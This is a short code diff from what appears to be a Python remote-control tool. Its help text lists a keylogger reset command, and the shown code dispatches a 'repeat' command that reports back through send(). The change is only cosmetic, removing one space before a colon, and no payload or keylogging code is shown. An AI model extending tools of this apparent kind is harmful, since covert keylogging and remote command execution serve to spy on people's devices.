@@ -2810,7 +2810,7 @@ keylogger -r  —  Reset keylogger data
 
     match cmd_lower[0]:
         case 'repeat':
-            if exp := parse_cmd(r'(?P<command>.*?)\s*-c\s*(?P<amount>\d+)\s*-d\s*(?P<delay>\d+)', args) :
+            if exp := parse_cmd(r'(?P<command>.*?)\s*-c\s*(?P<amount>\d+)\s*-d\s*(?P<delay>\d+)', args):
                 command, amount, delay = exp['command'], int(exp['amount']), int(exp['delay'])
 
                 send(f'started repeating ({command}) -c ({amount}) -s ({delay}) [*]')
